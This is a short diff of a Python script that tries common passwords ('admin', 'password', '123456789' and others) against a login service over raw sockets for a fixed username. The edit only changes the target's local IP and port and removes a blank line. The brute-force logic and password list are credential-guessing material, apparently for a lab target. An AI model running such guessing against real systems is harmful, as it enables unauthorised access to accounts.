@@ -2,8 +2,8 @@ import socket
 import re
 import sys
 
-IP = '192.168.1.105'
-PORT = 21
+IP = '192.168.1.180'
+PORT = 50505
 USERNAME = "Nulibyte"
 
 passwords = ["Test", "test", "admin", "Admin", "admin1", "password", "Password", "123", "123456789", "root"]
@@ -21,7 +21,6 @@ def connect(username, password):
     s.send('PASS'+password+'\r\n')
     data = s.recv(1024)
     s.send('QUIT\r\n')
-    
     s.close()
     return data
 
